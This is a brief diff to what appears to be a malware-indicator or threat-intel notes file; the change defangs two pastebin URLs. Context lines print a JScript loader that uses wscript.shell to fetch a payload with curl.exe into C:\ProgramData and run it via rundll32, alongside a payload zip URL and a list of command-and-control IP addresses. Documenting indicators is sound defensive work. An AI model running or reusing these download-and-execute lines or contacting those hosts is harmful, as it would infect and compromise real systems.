@@ -26,11 +26,11 @@ http://carolanticmhc.com/sync/64385c5455b89.zip
 
 .dll exec
 
-https://pastebin.com/raw/zD5ag0UX
+https://pastebin[.]com/raw/zD5ag0UX
 
 new ActiveXObject('wscript.shell').run('curl.exe --output c:\\programdata\\index.html --url ' + url, 6);
 
-https://pastebin.com/raw/mJfkXNYx 
+https://pastebin[.]com/raw/mJfkXNYx 
 
 new ActiveXObject('wscript.shell').run('rundll32 c:\\programdata\\index.html,Motd');
 
@@ -162,4 +162,5 @@ c2's
 90.211.192.113:443
 92.239.81.124:443
 209.93.207.224:2222
+
 
